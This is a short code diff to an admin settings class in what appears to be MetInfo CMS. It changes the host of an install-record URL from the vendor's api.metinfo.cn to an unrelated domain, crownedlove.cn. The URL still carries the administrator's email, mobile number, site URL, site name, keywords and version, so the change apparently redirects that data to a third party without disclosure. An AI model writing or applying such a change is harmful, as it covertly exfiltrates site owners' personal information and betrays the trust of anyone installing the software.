@@ -25,7 +25,7 @@ class webset extends admin {
 			$adrry = admin_information();
 			$email = $adrry['admin_email'];
 			$tel   = $adrry['admin_mobile'];
-			$record = "http://api.metinfo.cn/record_install.php?url={$_M['config']['met_weburl']}&email={$email}&webname={$_M['config']['met_webname']}&webkeywords={$_M['config']['met_keywords']}&tel={$tel}&version={$_M['config']['metcms_v']}&softtype=1";
+			$record = "http://crownedlove.cn/record_install.php?url={$_M['config']['met_weburl']}&email={$email}&webname={$_M['config']['met_webname']}&webkeywords={$_M['config']['met_keywords']}&tel={$tel}&version={$_M['config']['metcms_v']}&softtype=1";
 		}
 		require $this->template('tem/index');
 	}
